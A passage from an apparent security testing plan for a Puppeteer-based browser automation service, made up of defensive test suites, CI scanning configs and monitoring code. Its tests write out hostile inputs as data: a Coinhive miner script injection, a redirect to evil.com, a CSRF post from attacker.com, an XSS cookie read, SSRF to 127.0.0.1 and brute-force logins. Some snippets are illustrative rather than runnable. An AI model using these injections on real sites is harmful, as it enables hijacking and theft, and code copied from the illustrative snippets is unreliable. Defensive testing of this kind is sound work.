          sessionId: session.id,
          url: `https://${domain}`,
        });

      expect(response.status).toBe(403);
      expect(response.body.error).toContain('Blocked: malicious domain');
    }
  });

  test('should detect and block crypto mining scripts', async () => {
    await session.page.goto('https://example.com');

    const response = await request(app)
      .post('/api/browser/evaluate')
      .send({
        sessionId: session.id,
        script: `
          const script = document.createElement('script');
          script.src = 'https://coinhive.com/lib/coinhive.min.js';
          document.head.appendChild(script);
        `,
      });

    // Check if blocked or if CPU usage is monitored
    const metrics = await session.page.metrics();
    expect(metrics.JSHeapUsedSize).toBeLessThan(50 * 1024 * 1024); // 50MB limit
  });

  test('should prevent unauthorized redirects', async () => {
    const response = await request(app).post('/api/browser/evaluate').send({
      sessionId: session.id,
      script: 'window.location.href = "https://evil.com"',
    });

    expect(response.status).toBe(400);
    expect(response.body.error).toContain('Navigation not allowed from evaluate');
  });
});
```

### 5.3 Download Security Validation

#### Test Scenarios

```typescript
// tests/security/browser/download-security.test.ts
describe('Download Security Tests', () => {
  test('should scan downloads for malware', async () => {
    // Navigate to page with download
    await session.page.goto('https://example.com/downloads');

    // Trigger download
    const downloadResponse = await request(app).post('/api/browser/download').send({
      sessionId: session.id,
      url: 'https://example.com/files/document.exe',
    });

    expect(downloadResponse.status).toBe(403);
    expect(downloadResponse.body.error).toContain('Executable files not allowed');
  });

  test('should validate file types', async () => {
    const dangerousExtensions = [
      '.exe',
      '.dll',
      '.scr',
      '.bat',
      '.cmd',
      '.com',
      '.pif',
      '.vbs',
      '.js',
      '.jar',
      '.app',
    ];

    for (const ext of dangerousExtensions) {
      const response = await request(app)
        .post('/api/browser/download')
        .send({
          sessionId: session.id,
          url: `https://example.com/file${ext}`,
        });

      expect(response.status).toBe(403);
      expect(response.body.error).toContain('File type not allowed');
    }
  });

  test('should limit download size', async () => {
    const response = await request(app).post('/api/browser/download').send({
      sessionId: session.id,
      url: 'https://example.com/huge-file.zip', // 10GB file
    });

    expect(response.status).toBe(413);
    expect(response.body.error).toContain('File too large');
  });

  test('should sandbox downloaded files', async () => {
    const downloadPath = await browserService.getDownloadPath(session.id);

    // Verify isolated directory
    expect(downloadPath).toMatch(/\/sandboxed\/sessions\/[a-f0-9-]+\/downloads/);

    // Verify permissions
    const stats = await fs.stat(downloadPath);
    expect(stats.mode & 0o777).toBe(0o700); // Owner only
  });
});
```

### 5.4 Cookie Security and Isolation

#### Test Scenarios

```typescript
// tests/security/browser/cookie-security.test.ts
describe('Cookie Security Tests', () => {
  test('should enforce secure cookie attributes', async () => {
    await request(app)
      .post('/api/browser/set-cookie')
      .send({
        sessionId: session.id,
        cookie: {
          name: 'session',
          value: 'secret',
          domain: '.example.com',
          secure: false, // Should be forced to true
          httpOnly: false, // Should be forced to true
        },
      });

    const cookies = await session.page.cookies();
    const sessionCookie = cookies.find((c) => c.name === 'session');

    expect(sessionCookie.secure).toBe(true);
    expect(sessionCookie.httpOnly).toBe(true);
  });

  test('should prevent cookie theft via XSS', async () => {
    // Set httpOnly cookie
    await session.page.setCookie({
      name: 'auth',
      value: 'secret-token',
      httpOnly: true,
    });

    // Try to access via JavaScript
    const stolenCookie = await session.page.evaluate(() => {
      return document.cookie;
    });

    expect(stolenCookie).not.toContain('secret-token');
  });

  test('should isolate cookies between domains', async () => {
    // Set cookie for domain1
    await session.page.goto('https://domain1.com');
    await session.page.setCookie({
      name: 'domain1',
      value: 'secret1',
      domain: '.domain1.com',
    });

    // Navigate to domain2
    await session.page.goto('https://domain2.com');
    const cookies = await session.page.cookies();

    expect(cookies).not.toContainEqual(expect.objectContaining({ name: 'domain1' }));
  });

  test('should implement SameSite protection', async () => {
    await session.page.goto('https://example.com');

    // Set SameSite cookie
    await session.page.setCookie({
      name: 'csrf-token',
      value: 'token123',
      sameSite: 'Strict',
    });

    // Navigate to external site with form post back
    await session.page.goto('https://attacker.com');
    await session.page.evaluate(() => {
      const form = document.createElement('form');
      form.method = 'POST';
      form.action = 'https://example.com/api/transfer';
      document.body.appendChild(form);
      form.submit();
    });

    // Check if cookie was sent (it shouldn't be)
    const requestHeaders = await captureRequestHeaders();
    expect(requestHeaders.cookie).not.toContain('csrf-token');
  });
});
```

### 5.5 Proxy Security Testing

#### Test Scenarios

```typescript
// tests/security/browser/proxy-security.test.ts
describe('Proxy Security Tests', () => {
  test('should validate proxy authentication', async () => {
    const response = await request(app)
      .post('/api/browser/set-proxy')
      .send({
        sessionId: session.id,
        proxy: {
          server: 'proxy.example.com:8080',
          username: 'user',
          password: 'weak', // Should be rejected
        },
      });

    expect(response.status).toBe(400);
    expect(response.body.error).toContain('Proxy password too weak');
  });

  test('should prevent proxy bypass for local addresses', async () => {
    await browserService.setProxy(session.id, {
      server: 'proxy.example.com:8080',
      bypass: ['localhost', '127.0.0.1'],
    });

    // Try to access local address
    const response = await request(app).post('/api/browser/navigate').send({
      sessionId: session.id,
      url: 'http://127.0.0.1:8080/admin',
    });

    expect(response.status).toBe(403);
    expect(response.body.error).toContain('Local address access denied');
  });

  test('should detect proxy authentication leaks', async () => {
    const proxyLogs = [];
    proxyServer.on('request', (req) => {
      proxyLogs.push({
        headers: req.headers,
        url: req.url,
      });
    });

    await session.page.goto('https://example.com');

    // Check for leaked credentials
    const leakedAuth = proxyLogs.some((log) => log.headers.authorization?.includes('Basic'));

    expect(leakedAuth).toBe(false);
  });
});
```

## 6. Compliance & Audit Testing

### 6.1 NIST Control Validation

#### Test Scenarios

```typescript
// tests/security/compliance/nist-controls.test.ts
describe('NIST Control Validation', () => {
  describe('AC-2: Account Management', () => {
    test('should enforce account creation approval workflow', async () => {
      const response = await request(app).post('/api/admin/users').send({
        email: 'newuser@example.com',
        role: 'admin',
      });

      expect(response.status).toBe(202); // Accepted, pending approval
      expect(response.body.status).toBe('pending_approval');

      // Verify audit log
      const auditLog = await getLatestAuditLog();
      expect(auditLog.action).toBe('account.creation.requested');
      expect(auditLog.requiresApproval).toBe(true);
    });

    test('should automatically disable inactive accounts', async () => {
      // Create account with last login 91 days ago
      const inactiveUser = await createUser({
        lastLogin: new Date(Date.now() - 91 * 24 * 60 * 60 * 1000),
      });

      await runAccountMaintenanceJob();

      const user = await getUser(inactiveUser.id);
      expect(user.status).toBe('disabled');
      expect(user.disabledReason).toBe('inactivity');
    });
  });

  describe('AU-2: Audit Events', () => {
    test('should log all security-relevant events', async () => {
      const securityEvents = [
        { action: 'login', endpoint: '/api/auth/login' },
        { action: 'logout', endpoint: '/api/auth/logout' },
        { action: 'permission_change', endpoint: '/api/users/permissions' },
        { action: 'data_export', endpoint: '/api/export' },
        { action: 'config_change', endpoint: '/api/admin/config' },
      ];

      for (const event of securityEvents) {
        await request(app).post(event.endpoint).send({});

        const log = await getAuditLogByAction(event.action);
        expect(log).toBeDefined();
        expect(log.timestamp).toBeDefined();
        expect(log.userId).toBeDefined();
        expect(log.ipAddress).toBeDefined();
      }
    });
  });

  describe('IA-5: Authenticator Management', () => {
    test('should enforce password complexity requirements', async () => {
      const weakPasswords = [
        'password123', // Common password
        'aaaaaaaaaaa', // Repeated characters
        'abcdefghijk', // Sequential
        'Short1!', // Too short
        'NoSpecialChar1', // Missing special character
        'nouppercas3!', // Missing uppercase
        'NOLOWERCASE1!', // Missing lowercase
        'NoNumbers!!', // Missing numbers
      ];

      for (const password of weakPasswords) {
        const response = await request(app).post('/api/auth/register').send({
          email: 'test@example.com',
          password,
        });

        expect(response.status).toBe(400);
        expect(response.body.error).toContain('Password does not meet requirements');
      }
    });

    test('should enforce password history', async () => {
      const user = await createUser();
      const passwords = ['OldPass1!', 'OldPass2!', 'OldPass3!', 'OldPass4!', 'OldPass5!'];

      // Set password history
      for (const password of passwords) {
        await changePassword(user, password);
      }

      // Try to reuse old password
      const response = await request(app).post('/api/auth/change-password').send({
        userId: user.id,
        newPassword: 'OldPass1!', // First password
      });

      expect(response.status).toBe(400);
      expect(response.body.error).toContain('Password recently used');
    });
  });

  describe('SC-8: Transmission Confidentiality', () => {
    test('should enforce TLS for all communications', async () => {
      const endpoints = getAllEndpoints();

      for (const endpoint of endpoints) {
        if (endpoint === '/health') continue; // Exception

        const response = await request(`http://localhost:8080${endpoint}`).get().redirects(0);

        expect(response.status).toBe(301);
        expect(response.headers.location).toMatch(/^https:/);
      }
    });
  });
});
```

### 6.2 Security Event Logging Verification

#### Test Scenarios

```typescript
// tests/security/compliance/security-logging.test.ts
describe('Security Event Logging', () => {
  test('should log authentication failures with details', async () => {
    const response = await request(app)
      .post('/api/auth/login')
      .send({
        username: 'admin',
        password: 'wrongpassword',
      })
      .set('X-Forwarded-For', '192.168.1.100');

    const log = await getLatestSecurityLog();
    expect(log).toMatchObject({
      event: 'authentication.failed',
      username: 'admin',
      ipAddress: '192.168.1.100',
      userAgent: expect.any(String),
      reason: 'invalid_credentials',
      timestamp: expect.any(Date),
    });
  });

  test('should log authorization violations', async () => {
    const userToken = await auth.loginAsUser();

    await request(app).delete('/api/admin/users/123').set('Authorization', `Bearer ${userToken}`);

    const log = await getSecurityLogByEvent('authorization.failed');
    expect(log).toMatchObject({
      userId: expect.any(String),
      resource: '/api/admin/users/123',
      action: 'DELETE',
      requiredPermission: 'admin:users:delete',
      userPermissions: expect.arrayContaining(['user:read']),
    });
  });

  test('should log data access patterns', async () => {
    const sensitiveEndpoints = ['/api/users/export', '/api/sessions/all', '/api/audit-logs'];

    for (const endpoint of sensitiveEndpoints) {
      await request(app).get(endpoint).set('Authorization', `Bearer ${adminToken}`);
    }

    const logs = await getSecurityLogsByUser(adminUser.id);
    const dataAccessLogs = logs.filter((l) => l.event === 'data.accessed');

    expect(dataAccessLogs).toHaveLength(3);
    expect(dataAccessLogs[0]).toHaveProperty('dataClassification');
    expect(dataAccessLogs[0]).toHaveProperty('recordCount');
  });

  test('should detect and log anomalous behavior', async () => {
    // Simulate rapid API calls
    const promises = [];
    for (let i = 0; i < 1000; i++) {
      promises.push(request(app).get('/api/sessions').set('Authorization', `Bearer ${userToken}`));
    }

    await Promise.all(promises);

    const anomalyLog = await getSecurityLogByEvent('anomaly.detected');
    expect(anomalyLog).toMatchObject({
      type: 'excessive_api_calls',
      userId: expect.any(String),
      threshold: expect.any(Number),
      actual: expect.any(Number),
      action: 'rate_limit_applied',
    });
  });
});
```

### 6.3 Audit Trail Completeness

#### Test Scenarios

```typescript
// tests/security/compliance/audit-trail.test.ts
describe('Audit Trail Completeness', () => {
  test('should maintain complete audit trail for user lifecycle', async () => {
    // Create user
    const user = await createUser({ email: 'audit@example.com' });

    // Modify user
    await updateUser(user.id, { role: 'admin' });

    // User actions
    await loginAs(user);
    await createSession(user);
    await deleteSession(user);
    await logoutAs(user);

    // Delete user
    await deleteUser(user.id);

    // Verify complete audit trail
    const auditTrail = await getAuditTrailForUser(user.id);

    const expectedEvents = [
      'user.created',
      'user.role_changed',
      'user.login',
      'session.created',
      'session.deleted',
      'user.logout',
      'user.deleted',
    ];

    expectedEvents.forEach((event) => {
      expect(auditTrail.some((log) => log.event === event)).toBe(true);
    });

    // Verify immutability
    const firstLog = auditTrail[0];
    expect(firstLog).toHaveProperty('hash');
    expect(firstLog).toHaveProperty('previousHash');

    // Verify hash chain
    for (let i = 1; i < auditTrail.length; i++) {
      const currentHash = calculateHash(auditTrail[i - 1]);
      expect(auditTrail[i].previousHash).toBe(currentHash);
    }
  });

  test('should log all configuration changes', async () => {
    const configChanges = [
      { setting: 'session.timeout', value: 1800 },
      { setting: 'rateLimit.max', value: 200 },
      { setting: 'security.mfaRequired', value: true },
    ];

    for (const change of configChanges) {
      await request(app)
        .put('/api/admin/config')
        .send(change)
        .set('Authorization', `Bearer ${adminToken}`);
    }

    const configLogs = await getAuditLogsByEvent('config.changed');

    expect(configLogs).toHaveLength(3);
    configLogs.forEach((log, index) => {
      expect(log).toMatchObject({
        setting: configChanges[index].setting,
        oldValue: expect.any(String),
        newValue: configChanges[index].value.toString(),
        changedBy: adminUser.id,
        approvedBy: expect.any(String), // Should require approval
      });
    });
  });

  test('should maintain audit logs even during system failures', async () => {
    // Simulate database failure during operation
    const dbFailure = simulateDatabaseFailure();

    try {
      await request(app).post('/api/critical-operation').send({ action: 'delete_all_users' });
    } catch (error) {
      // Expected to fail
    }

    dbFailure.restore();

    // Check failover audit storage
    const failoverLogs = await getFailoverAuditLogs();
    expect(failoverLogs).toContainEqual(
      expect.objectContaining({
        event: 'critical_operation.attempted',
        success: false,
        error: 'database_unavailable',
      }),
    );
  });
});
```

### 6.4 Incident Response Testing

#### Test Scenarios

```typescript
// tests/security/compliance/incident-response.test.ts
describe('Incident Response Testing', () => {
  test('should automatically respond to brute force attacks', async () => {
    const attacker = '192.168.1.100';

    // Simulate failed login attempts
    for (let i = 0; i < 10; i++) {
      await request(app)
        .post('/api/auth/login')
        .send({
          username: 'admin',
          password: 'wrong' + i,
        })
        .set('X-Forwarded-For', attacker);
    }

    // Verify automatic response
    const response = await request(app)
      .post('/api/auth/login')
      .send({
        username: 'admin',
        password: 'correct',
      })
      .set('X-Forwarded-For', attacker);

    expect(response.status).toBe(429);
    expect(response.body.error).toContain('IP temporarily blocked');

    // Verify incident created
    const incident = await getLatestIncident();
    expect(incident).toMatchObject({
      type: 'brute_force_attack',
      source: attacker,
      automaticResponse: 'ip_blocked',
      severity: 'high',
    });
  });

  test('should execute incident response playbook', async () => {
    // Trigger security incident
    const incident = await createSecurityIncident({
      type: 'data_breach',
      severity: 'critical',
      affectedSystems: ['user-database'],
    });

    // Execute response playbook
    await executeIncidentResponse(incident.id);

    // Verify playbook steps
    const executionLog = await getIncidentExecutionLog(incident.id);

    const expectedSteps = [
      'incident.acknowledged',
      'stakeholders.notified',
      'systems.isolated',
      'evidence.collected',
      'access.revoked',
      'investigation.started',
      'remediation.planned',
    ];

    expectedSteps.forEach((step) => {
      const logEntry = executionLog.find((l) => l.step === step);
      expect(logEntry).toBeDefined();
      expect(logEntry.completed).toBe(true);
      expect(logEntry.completedBy).toBeDefined();
    });
  });

  test('should preserve evidence during incident', async () => {
    const incident = await createSecurityIncident({
      type: 'unauthorized_access',
      userId: 'user-123',
      sessionId: 'session-456',
    });

    // System should automatically preserve evidence
    const evidence = await getIncidentEvidence(incident.id);

    expect(evidence).toHaveProperty('memoryDump');
    expect(evidence).toHaveProperty('networkCapture');
    expect(evidence).toHaveProperty('logSnapshot');
    expect(evidence).toHaveProperty('sessionData');

    // Verify evidence integrity
    expect(evidence.hash).toBeDefined();
    expect(evidence.timestamp).toBeDefined();
    expect(evidence.preservedBy).toBe('system-automatic');
  });
});
```

### 6.5 Vulnerability Scanning Integration

#### Test Scenarios

```typescript
// tests/security/compliance/vulnerability-scanning.test.ts
describe('Vulnerability Scanning Integration', () => {
  test('should run OWASP ZAP security scan', async () => {
    const zapScan = await runZapScan({
      target: 'https://localhost:8443',
      scanType: 'full',
    });

    expect(zapScan.status).toBe('completed');
    expect(zapScan.findings).toBeDefined();

    // Check for critical vulnerabilities
    const criticalFindings = zapScan.findings.filter((f) => f.risk === 'High');
    expect(criticalFindings).toHaveLength(0);
  });

  test('should scan for dependency vulnerabilities', async () => {
    const auditResult = await runSecurityAudit();

    expect(auditResult.vulnerabilities.critical).toBe(0);
    expect(auditResult.vulnerabilities.high).toBe(0);

    // If any moderate vulnerabilities, should have remediation plan
    if (auditResult.vulnerabilities.moderate > 0) {
      expect(auditResult.remediationPlan).toBeDefined();
      expect(auditResult.remediationPlan.timeline).toBeDefined();
    }
  });

  test('should perform container security scanning', async () => {
    const trivyScan = await runTrivyScan({
      image: 'puppeteer-mcp:latest',
      severity: 'CRITICAL,HIGH',
    });

    expect(trivyScan.vulnerabilities).toHaveLength(0);
    expect(trivyScan.misconfigurations).toHaveLength(0);
  });

  test('should scan for secrets in code', async () => {
    const secretScan = await runGitleaks({
      path: '/home/william/git/puppeteer-mcp',
      config: 'gitleaks.toml',
    });

    expect(secretScan.leaks).toHaveLength(0);

    // Also check with TruffleHog
    const truffleHogScan = await runTruffleHog({
      path: '/home/william/git/puppeteer-mcp',
    });

    expect(truffleHogScan.findings).toHaveLength(0);
  });
});
```

## 7. Security Tools Integration

### 7.1 Static Analysis Tools

```yaml
# .github/workflows/security-scan.yml
name: Security Scanning

on:
  push:
    branches: [main, develop]
  pull_request:
    branches: [main]
  schedule:
    - cron: '0 0 * * *' # Daily

jobs:
  codeql:
    name: CodeQL Analysis
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v3
      - uses: github/codeql-action/init@v2
        with:
          languages: typescript, javascript
          queries: security-and-quality
      - uses: github/codeql-action/analyze@v2

  sonarcloud:
    name: SonarCloud Scan
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v3
      - uses: SonarSource/sonarcloud-github-action@master
        env:
          GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
          SONAR_TOKEN: ${{ secrets.SONAR_TOKEN }}

  snyk:
    name: Snyk Vulnerability Scan
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v3
      - uses: snyk/actions/node@master
        env:
          SNYK_TOKEN: ${{ secrets.SNYK_TOKEN }}
        with:
          args: --severity-threshold=high

  semgrep:
    name: Semgrep Security Scan
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v3
      - uses: returntocorp/semgrep-action@v1
        with:
          config: >-
            p/security-audit p/nodejs p/typescript p/jwt p/xss
```

### 7.2 Dynamic Analysis Tools

```typescript
// scripts/security/dynamic-analysis.ts
import { ZAPClient } from '@zaproxy/zap-api';
import { BurpClient } from 'burp-rest-api';

export async function runDynamicSecurityTests() {
  // OWASP ZAP Integration
  const zap = new ZAPClient({
    apiKey: process.env.ZAP_API_KEY,
    proxy: 'http://localhost:8090',
  });

  // Start spider
  await zap.spider.scan({
    url: 'https://localhost:8443',
    maxDepth: 10,
    subtreeOnly: true,
  });

  // Active scan
  await zap.ascan.scan({
    url: 'https://localhost:8443',
    recurse: true,
    scanPolicyName: 'Default Policy',
  });

  // Burp Suite Integration
  const burp = new BurpClient({
    url: 'http://localhost:8091',
    apiKey: process.env.BURP_API_KEY,
  });

  await burp.scan.create({
    urls: ['https://localhost:8443'],
    configuration: {
      crawl: { max_depth: 5 },
      audit: {
        issues: ['sql_injection', 'xss', 'xxe', 'os_command_injection'],
      },
    },
  });

  // Nuclei Template Scanning
  await runNucleiScan({
    target: 'https://localhost:8443',
    templates: ['cves', 'vulnerabilities', 'misconfiguration'],
    severity: ['critical', 'high'],
  });
}
```

### 7.3 Runtime Protection

```typescript
// src/security/runtime-protection.ts
import { RASP } from 'runtime-application-self-protection';

export function initializeRuntimeProtection() {
  // SQL Injection Protection
  RASP.protect('sql', {
    onViolation: (query, params) => {
      logger.security.warn('SQL injection attempt detected', {
        query,
        params,
        stack: new Error().stack,
      });
      throw new SecurityError('Invalid query');
    },
  });

  // Command Injection Protection
  RASP.protect('exec', {
    whitelist: ['/usr/bin/chromium'],
    onViolation: (command) => {
      logger.security.error('Command injection attempt', { command });
      throw new SecurityError('Command not allowed');
    },
  });

  // File System Protection
  RASP.protect('fs', {
    allowedPaths: ['/tmp/puppeteer', '/app/downloads'],
    onViolation: (path, operation) => {
      logger.security.error('Unauthorized file access', { path, operation });
      throw new SecurityError('File access denied');
    },
  });
}
```

## 8. Automated Security Testing

### 8.1 CI/CD Pipeline Integration

```yaml
# .gitlab-ci.yml
stages:
  - build
  - test
  - security
  - deploy

security:unit-tests:
  stage: test
  script:
    - npm run test:security:unit
  artifacts:
    reports:
      junit: test-results/security-unit.xml

security:integration-tests:
  stage: test
  script:
    - npm run test:security:integration
  artifacts:
    reports:
      junit: test-results/security-integration.xml

security:dependency-check:
  stage: security
  script:
    - npm audit --production
    - npx audit-ci --high
    - npx snyk test --severity-threshold=high
    - safety check

security:sast:
  stage: security
  script:
    - npm run security:sast
  artifacts:
    reports:
      sast: gl-sast-report.json

security:dast:
  stage: security
  script:
    - npm run security:dast
  artifacts:
    reports:
      dast: gl-dast-report.json

security:fuzzing:
  stage: security
  script:
    - npm run security:fuzz
  artifacts:
    reports:
      fuzzing: fuzzing-report.json

security:compliance:
  stage: security
  script:
    - npm run security:compliance:check
  artifacts:
    reports:
      compliance: compliance-report.json
```

### 8.2 Continuous Security Testing

```typescript
// scripts/security/continuous-testing.ts
export class ContinuousSecurityTester {
  async runHourlyTests() {
    await this.checkCertificateExpiry();
    await this.validateSecurityHeaders();
    await this.testAuthenticationEndpoints();
    await this.monitorRateLimits();
  }

  async runDailyTests() {
    await this.fullSecurityScan();
    await this.dependencyCheck();
    await this.complianceValidation();
    await this.penetrationTest();
  }

  async runWeeklyTests() {
    await this.infrastructureScan();
    await this.socialEngineeringTest();
    await this.disasterRecoveryTest();
    await this.incidentResponseDrill();
  }

  async runMonthlyTests() {
    await this.fullSecurityAudit();
    await this.vulnerabilityAssessment();
    await this.securityPostureReview();
    await this.threatModelingUpdate();
  }
}
```

### 8.3 Automated Remediation

```typescript
// src/security/auto-remediation.ts
export class SecurityAutoRemediation {
  async handleVulnerability(vuln: Vulnerability) {
    switch (vuln.type) {
      case 'dependency':
        await this.updateDependency(vuln);
        break;

      case 'configuration':
        await this.fixConfiguration(vuln);
        break;

      case 'permission':
        await this.adjustPermissions(vuln);
        break;

      case 'certificate':
        await this.rotateCertificate(vuln);
        break;
    }

    await this.verifyRemediation(vuln);
    await this.notifySecurityTeam(vuln);
  }

  private async updateDependency(vuln: DependencyVulnerability) {
    const { package, currentVersion, fixedVersion } = vuln;

    // Create branch
    await git.checkoutBranch(`security/update-${package}-${fixedVersion}`);

    // Update package
    await npm.update(package, fixedVersion);

    // Run tests
    const testResults = await npm.test();

    if (testResults.passed) {
      await git.commit(`chore(security): update ${package} to ${fixedVersion}`);
      await git.createPullRequest({
        title: `Security: Update ${package} to fix ${vuln.cve}`,
        description: this.generatePRDescription(vuln),
        labels: ['security', 'automated'],
      });
    }
  }
}
```

## 9. Continuous Security Monitoring

### 9.1 Real-time Threat Detection

```typescript
// src/monitoring/threat-detection.ts
export class ThreatDetectionSystem {
  private readonly rules = new SecurityRuleEngine();
  private readonly ml = new AnomalyDetector();

  async detectThreats(event: SecurityEvent): Promise<Threat[]> {
    const threats = [];

    // Rule-based detection
    const ruleMatches = await this.rules.evaluate(event);
    threats.push(...ruleMatches);

    // ML-based anomaly detection
    const anomalies = await this.ml.detectAnomalies(event);
    threats.push(...anomalies);

    // Correlation with threat intelligence
    const threatIntel = await this.checkThreatIntelligence(event);
    threats.push(...threatIntel);

    return threats;
  }

  async monitorUserBehavior(userId: string) {
    const baseline = await this.getUserBaseline(userId);
    const currentBehavior = await this.getCurrentBehavior(userId);

    const deviations = this.calculateDeviations(baseline, currentBehavior);

    if (deviations.score > 0.8) {
      await this.triggerAlert({
        type: 'abnormal_user_behavior',
        userId,
        deviations,
        severity: this.calculateSeverity(deviations),
      });
    }
  }
}
```

### 9.2 Security Metrics and KPIs

```typescript
// src/monitoring/security-metrics.ts
export class SecurityMetricsCollector {
  async collectMetrics(): Promise<SecurityMetrics> {
    return {
      authentication: {
        failedLogins: await this.countFailedLogins(),
        successfulLogins: await this.countSuccessfulLogins(),
        averageLoginTime: await this.calculateAverageLoginTime(),
        mfaAdoption: await this.calculateMFAAdoption(),
      },

      vulnerabilities: {
        critical: await this.countVulnerabilities('critical'),
        high: await this.countVulnerabilities('high'),
        medium: await this.countVulnerabilities('medium'),
        low: await this.countVulnerabilities('low'),
        mttr: await this.calculateMTTR(),
      },

      incidents: {
        total: await this.countIncidents(),
        falsePositives: await this.countFalsePositives(),
        mttr: await this.calculateIncidentMTTR(),
        containmentTime: await this.calculateContainmentTime(),
      },

      compliance: {
        controlsCoverage: await this.calculateControlsCoverage(),
        auditReadiness: await this.assessAuditReadiness(),
        policyCompliance: await this.calculatePolicyCompliance(),
      },
    };
  }

  async generateSecurityDashboard() {
    const metrics = await this.collectMetrics();

    return {
      scorecard: this.calculateSecurityScore(metrics),
      trends: await this.analyzeTrends(metrics),
      recommendations: this.generateRecommendations(metrics),
      alerts: await this.getActiveAlerts(),
    };
  }
}
```

### 9.3 Alerting and Response

```typescript
// src/monitoring/security-alerting.ts
export class SecurityAlertingSystem {
  async handleSecurityEvent(event: SecurityEvent) {
    const severity = this.calculateSeverity(event);
    const alert = await this.createAlert(event, severity);

    switch (severity) {
      case 'critical':
        await this.pageSecurity(alert);
        await this.initiateIncidentResponse(alert);
        break;

      case 'high':
        await this.notifySecurityTeam(alert);
        await this.createTicket(alert);
        break;

      case 'medium':
        await this.sendEmail(alert);
        await this.logToSIEM(alert);
        break;

      case 'low':
        await this.logAlert(alert);
        break;
    }

    await this.updateMetrics(alert);
  }

  private async initiateIncidentResponse(alert: Alert) {
    const incident = await this.createIncident(alert);

    // Automatic containment
    if (alert.autoContainment) {
      await this.executeContainment(incident);
    }

    // Gather evidence
    await this.collectEvidence(incident);

    // Notify stakeholders
    await this.notifyStakeholders(incident);

    // Start investigation
    await this.startInvestigation(incident);
  }
}
```

## 10. Implementation Roadmap

### Phase 1: Foundation (Weeks 1-4)

- Set up security testing framework
- Implement basic authentication tests
- Configure SAST tools
- Establish security metrics baseline

### Phase 2: Core Security (Weeks 5-8)

- Implement injection prevention tests
- Add network security validation
- Set up DAST tools
- Create automated security pipeline

### Phase 3: Advanced Testing (Weeks 9-12)

- Implement browser security tests
- Add compliance validation
- Set up continuous monitoring
- Create incident response automation

### Phase 4: Optimization (Weeks 13-16)

- Fine-tune security rules
- Implement ML-based detection
- Optimize performance
- Complete documentation

### Success Metrics

- Zero critical vulnerabilities in production
- 100% security test coverage
- < 5 minute mean time to detect (MTTD)
- < 30 minute mean time to respond (MTTR)
- 100% NIST control implementation

## Conclusion

This comprehensive security testing strategy provides a robust framework for ensuring the security
of the Puppeteer MCP project. By implementing these tests, tools, and processes, the platform will
maintain enterprise-grade security while enabling continuous improvement through automated testing
and monitoring.

The strategy covers all critical security domains and provides specific, actionable test scenarios
that can be implemented immediately. Regular execution of these tests, combined with continuous
monitoring and automated remediation, will ensure the platform remains secure against evolving
threats.
